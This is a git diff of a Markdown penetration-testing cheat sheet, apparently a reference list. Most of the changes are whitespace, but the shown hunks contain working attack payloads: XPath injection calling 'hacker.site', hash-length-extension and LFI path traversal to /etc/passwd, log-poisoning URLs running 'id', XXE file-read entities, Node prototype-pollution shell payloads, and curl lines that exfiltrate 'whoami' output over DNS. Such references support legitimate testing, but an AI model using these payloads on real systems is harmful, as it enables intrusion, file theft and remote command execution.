@@ -432,9 +432,9 @@ https://github.com/RhinoSecurityLabs/pacu
   
 ## XPATH
   
-`error()` 
-`* and doc('http://hacker.site/')`
-`* and doc('http://hacker.site/', name(/*) ))`
+`error()`  
+`* and doc('http://hacker.site/')`  
+`* and doc('http://hacker.site/', name(/*) ))`  
   
 ### Tools
   
@@ -544,7 +544,7 @@ https://github.com/wuppp/shiro_rce_exp/blob/master/shiro_exp.py
 https://site.com/index.php?file=oktest&hash=hash
 
 -> Exploitation  
-1-
+1-  
 `./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out`  
 https://github.com/iagox86/hash_extender
 
@@ -567,7 +567,7 @@ https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-f
 
 #### Common
 
-`/etc/passwd`
+`/etc/passwd`  
 `../../../../etc/passwd`
 
 #### Replace ../
@@ -659,9 +659,9 @@ http://ip/index.php?file=/var/log/apache2/access.log&cmd=id
 `http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id`  
   
 -> Other Paths  
-/var/log/sshd.log  
-/var/log/vsftpd.log  
-/proc/self/fd/0-50
+`/var/log/sshd.log`  
+`/var/log/vsftpd.log`  
+`/proc/self/fd/0-50`
   
 ### LFI - files for fuzzing
 
@@ -893,9 +893,9 @@ https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ### Methods:
 
-`<!ENTITY % file SYSTEM "file:///etc/passwd">`
-`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">`
-`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`
+`<!ENTITY % file SYSTEM "file:///etc/passwd">`  
+`<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">`  
+`<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`  
 
 ## XXE - Blind Out-Of-Band
 
@@ -964,15 +964,15 @@ https://github.com/BlackFan/client-side-prototype-pollution
 
 -> exec.exec in req body with lodash - application/json
   
-https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
 ```
 "__proto__":{
   "shell":"sleep 5"
 }
-```
+```  
+https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback
   
 -> exec.fork in req body with lodash - application/json  
-https://nodejs.org/api/process.html
+
 ```
   "__proto__":{
     "execPath":"/bin/bash",
@@ -981,12 +981,12 @@ https://nodejs.org/api/process.html
     "sleep 5"  
     ]
   }
-```
+```  
+https://nodejs.org/api/process.html
 
 ### RCE - Exfiltrating via dns
 
-`curl http://$(whoami).site.com/`
-
+`curl http://$(whoami).site.com/`  
 `curl http://\`whoami\`.site.com/`
 
 ### Shellshock
